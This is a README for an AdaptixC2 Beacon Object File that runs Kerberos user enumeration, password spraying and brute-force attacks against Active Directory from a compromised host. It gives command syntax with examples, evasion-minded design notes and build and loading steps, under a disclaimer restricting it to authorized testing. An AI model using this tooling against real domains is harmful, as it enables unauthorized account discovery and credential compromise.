# adaptix-kerbrute

An AdaptixC2 Beacon Object File (BOF) that implements Kerberos-based user
enumeration and password attacks directly inside the beacon process.

Inspired by [ropnop/kerbrute](https://github.com/ropnop/kerbrute).  
Built for use with [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2).

> **This tool is for authorised penetration testing and red team engagements
> only. See the [Disclaimer](#disclaimer) section before use.**

---

## How it works

The BOF runs entirely in-process inside the beacon:

- **No child process is spawned** — no `cmd.exe`, no `net.exe`, nothing
- **No files are written to the target** — wordlists are read from the
  operator's local machine by AdaptixClient, base64-encoded, and forwarded
  to the BOF as packed arguments
- All Kerberos packets are built and sent by the BOF itself over a direct
  TCP connection to port 88 of the Domain Controller
- Crypto (MD4, HMAC-MD5, RC4) is implemented inline — no CRT dependency,
  BCrypt is the only external provider used

---

## Commands

| Command | Description | Lockout risk |
|---|---|---|
| `userenum` | Enumerate valid domain accounts via AS-REQ without pre-auth | ❌ None |
| `passwordspray` | Test one password against a user list | ⚠️ Yes |
| `bruteuser` | Brute-force one account with a password list | ⚠️ Yes |
| `bruteforce` | Test username:password combos from a file | ⚠️ Yes |

### userenum

Sends an AS-REQ without pre-authentication for each username. If the KDC
returns `PREAUTH_REQUIRED` the account exists; `PRINCIPAL_UNKNOWN` means it
does not. No `badPwdCount` increment. Generates event **4768** if Kerberos
logging is enabled.

```
userenum -d <domain> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <userlist>
```

```
userenum -d contoso.local /home/operator/users.txt
userenum -d contoso.local --dc 192.168.1.10 --safe -v /home/operator/users.txt
userenum -d contoso.local --delay 500 --downgrade /home/operator/users.txt
```

### passwordspray

Tests one password against every user in the list using an RC4-HMAC encrypted
timestamp. Increments `badPwdCount`. Generates events **4768** and **4771**.

```
passwordspray -d <domain> -p <password> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <userlist>
```

```
passwordspray -d contoso.local -p Password123 /home/operator/users.txt
passwordspray -d contoso.local -p Summer2024! --dc 192.168.1.10 --safe --delay 1000 /home/operator/users.txt
```

### bruteuser

Tries every password in the list against a single account. Stops immediately
on the first valid hit or the moment the account is locked out. Increments
`badPwdCount`. Generates events **4768** and **4771**.

```
bruteuser -d <domain> -u <username> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <passwordlist>
```

```
bruteuser -d contoso.local -u jdoe /home/operator/rockyou.txt
bruteuser -d contoso.local -u administrator --dc 192.168.1.10 --safe --delay 200 /home/operator/top500.txt
```

### bruteforce

Reads `username:password` pairs from a combo file and tests each one.
Increments `badPwdCount`. Generates events **4768** and **4771**.

```
bruteforce -d <domain> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <combofile>
```

```
bruteforce -d contoso.local /home/operator/combos.txt
bruteforce -d contoso.local --dc 192.168.1.10 --safe --delay 500 -v /home/operator/combos.txt
```

Combo file format — one entry per line:

```
jdoe:Password123
administrator:Summer2024!
svc_backup:Welcome1
```

---

## Common flags

All four commands accept the following optional flags:

| Flag | Description |
|---|---|
| `--dc <ip>` | DC hostname or IP. If omitted the BOF resolves the KDC via DNS using the domain name. |
| `--delay <ms>` | Sleep this many milliseconds between each attempt. Recommended for spraying to stay under lockout thresholds. |
| `--downgrade` | Advertise only RC4 (`arcfour-hmac-md5`, etype 23) in the AS-REQ etype list instead of the default AES256 + AES128 + RC4. |
| `--safe` | Abort all remaining attempts the moment any account comes back as locked out. |
| `-v` | Verbose — also log wrong passwords, not-found users, and errors (silent by default). |

### Output tags

```
[+] VALID USER               account exists, pre-auth required
[+] VALID (no preauth)       account exists, no pre-auth — AS-REP roastable!
[+] VALID LOGIN              correct credentials
[+] VALID (expired)          correct credentials but password is expired
[!] LOCKED/DISABLED          account is locked or disabled
[-] NOT FOUND                account does not exist        (verbose only)
[-] WRONG PASSWORD           wrong password, user exists   (verbose only)
[!] ERROR                    network or build error        (verbose only)
[!] Safe mode — aborting     lockout detected, run stopped (--safe)
```

---

## Prerequisites

### Operator machine (building the BOF)

- Linux (Kali, Parrot, Ubuntu, Arch)
- `mingw-w64` cross-compiler

```bash
# Debian / Ubuntu / Kali / Parrot
sudo apt install gcc-mingw-w64-x86-64-posix

# Arch
sudo pacman -Syu mingw-w64-gcc
```

### Target

- Windows beacon active in AdaptixC2
- Network path from the compromised host to the Domain Controller on **TCP port 88**

---

## Building

```bash
git clone https://github.com/<you>/adaptix-kerbrute
cd adaptix-kerbrute
make
```

This produces:

```
kerbrute.x64.o   — 64-bit BOF (use this for x64 beacons)
kerbrute.x86.o   — 32-bit BOF (use this for x86 beacons)
```

The Makefile:

```makefile
CC64   = x86_64-w64-mingw32-gcc
CC32   = i686-w64-mingw32-gcc
CFLAGS = -masm=intel -Wall -Wno-unused-variable \
         -Wno-unused-function -Wno-misleading-indentation \
         -fno-stack-check

all: kerbrute.x64.o kerbrute.x86.o

kerbrute.x64.o: kerbrute.c
	$(CC64) $(CFLAGS) -o $@ -c $<

kerbrute.x86.o: kerbrute.c
	$(CC32) $(CFLAGS) -o $@ -c $<

clean:
	rm -f kerbrute.x64.o kerbrute.x86.o
```

---

## Repository structure

```
adaptix-kerbrute/
├── kerbrute.c        BOF source code
├── beacon.h          Standard BOF API header (Cobalt Strike / Adaptix compatible)
├── kerbrute.axs      AxScript — registers commands in AdaptixClient
├── Makefile          Cross-compile for x64 and x86
└── README.md
```

> **Note:** Compiled `.o` files are not included. Build them locally with the
> instructions above.

---

## Loading into AdaptixC2

1. Build the BOF (`make`)
2. Place `kerbrute.x64.o` and `kerbrute.axs` in the same directory
3. In AdaptixClient: **Main menu → AxScript → Script Manager**
4. Right-click → **Load new** → select `kerbrute.axs`
5. The four commands are now available in any Windows beacon console

Verify the load:

```
Group - Kerbrute (client)
=====================================
userenum       Enumerate valid domain usernames via Kerberos — no pre-auth, no lockout risk
passwordspray  Test a single password against a list of users — [LOCKOUT RISK]
bruteuser      Bruteforce a single user's password from a wordlist — stops on first hit [LOCKOUT RISK]
bruteforce     Read username:password combos from a file and test them — [LOCKOUT RISK]
```

To see full argument reference for any command, type it with no arguments:

```
beacon > userenum
[-] Missing required argument: domain

Usage: userenum <-d domain> [--dc dc] [--delay delay] [--downgrade] [--safe] [-v] <userlist>

Arguments:
<-d domain>     : STRING. Target domain FQDN (e.g. contoso.local)
[--dc dc]       : STRING. DC hostname or IP — DNS SRV lookup used if omitted
[--delay delay] : INT.    Sleep this many milliseconds between each attempt
[--downgrade]   : BOOL.   Advertise RC4-only in the etype list (arcfour-hmac-md5)
[--safe]        : BOOL.   Abort all remaining attempts if any account is locked out
[-v]            : BOOL.   Verbose — also log not-found users and errors
<userlist>      : FILE.   Local path to wordlist — one username per line
```

---

## Technical notes

### Kerberos error codes

| Code | Constant | Meaning |
|---|---|---|
| 6 | `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User does not exist |
| 12 | `KDC_ERR_POLICY` | Policy restriction — user exists, creds treated as valid |
| 14 | `KDC_ERR_ETYPE_NOSUPP` | DC rejected RC4 pre-auth — account is AES-only, creds treated as valid |
| 18 | `KDC_ERR_CLIENT_REVOKED` | Account locked or disabled |
| 23 | `KDC_ERR_KEY_EXPIRED` | Password expired — credentials valid |
| 24 | `KDC_ERR_PREAUTH_FAILED` | Wrong password |
| 25 | `KDC_ERR_PREAUTH_REQUIRED` | User exists, pre-auth needed |
| 37 | `KDC_ERR_MUST_USE_USER2USER` | Service ticket constraint — creds treated as valid |
| other | — | Unknown — printed as `[?] Unknown KRB error <N>` for manual review |

### Output tags

```
[+] VALID USER               account exists, pre-auth required           (userenum)
[+] VALID (no preauth)       account exists, no pre-auth — AS-REP roastable!
[+] VALID LOGIN              correct credentials                          (spray/brute)
[+] VALID (expired)          correct credentials, password expired
[!] LOCKED/DISABLED          account is locked or disabled
[!] Safe mode — aborting     lockout detected, run stopped                (--safe)
[!] ETYPE_NOSUPP             DC rejected RC4; account AES-only, creds likely valid
[?] Unknown KRB error <N>    unrecognised KDC response — investigate manually
[-] NOT FOUND                user does not exist                          (-v only)
[-] WRONG PASSWORD           wrong password, user exists                  (-v only)
```

### Crypto

Password spray modes use **RC4-HMAC (etype 23)** per RFC 4757:

- **NT hash** — `MD4(UTF-16LE(password))` implemented inline (no CRT)
- **HMAC-MD5** — via Windows BCrypt (`MD5` with `BCRYPT_ALG_HANDLE_HMAC_FLAG`)
- **RC4** — via Windows BCrypt (`RC4` symmetric key provider)

Key derivation:
```
K1       = HMAC-MD5(NT_hash, LE32(key_usage=1))
Checksum = HMAC-MD5(K1, confounder || PA-ENC-TS-ENC)
K3       = HMAC-MD5(K1, Checksum)
Cipher   = RC4(K3, confounder || PA-ENC-TS-ENC)
Result   = Checksum || Cipher
```

### Network

All requests use **TCP port 88** with the standard 4-byte big-endian length
prefix Kerberos uses over TCP. A 5-second send/receive timeout is applied per
attempt.

IP address strings (e.g. `10.0.0.1`) are parsed with a pure-C dotted-decimal
parser — no `inet_addr()` or `WSAStartup()` calls. The BOF relies on the
beacon's existing Winsock initialisation rather than reinitialising it, which
is standard practice for BOFs that perform network operations.

### Notes on `--downgrade`

`--downgrade` forces the etype list in the AS-REQ to advertise **only RC4**
(`arcfour-hmac-md5`, etype 23). Without it the BOF advertises AES256 + AES128
+ RC4, letting the DC negotiate. Use `--downgrade` against legacy DCs that do
not support AES. On modern DCs with RC4 **disabled**, omit `--downgrade` — the
DC will return `ETYPE_NOSUPP (14)` for RC4 pre-auth, which the BOF correctly
treats as "credentials are likely valid, account is AES-only".

---

## Disclaimer

> This tool is provided for **educational purposes** and for use in
> **authorised security testing engagements only**.
>
> Using this tool against systems, networks, or accounts without explicit
> written permission from the system owner is **illegal** and may violate
> local, national, and international law including but not limited to the
> Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and the
> EU Directive on Attacks Against Information Systems.
>
> The author(s) accept **no responsibility or liability** for any misuse,
> damage, or legal consequences arising from the use of this tool.
>
> **Always obtain proper authorisation before conducting any security testing.**
> Red team and penetration testing activities must be performed under a signed
> Rules of Engagement (RoE) document. Unauthorised use is strictly prohibited.

---

## References

- [ropnop/kerbrute](https://github.com/ropnop/kerbrute) — original Go implementation this BOF is based on
- [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) — the C2 framework
- [Adaptix Extension-Kit](https://github.com/Adaptix-Framework/Extension-Kit) — BOF development reference
- [RFC 4757](https://datatracker.ietf.org/doc/html/rfc4757) — RC4-HMAC Kerberos encryption
- [RFC 4120](https://datatracker.ietf.org/doc/html/rfc4120) — The Kerberos Network Authentication Service (V5)
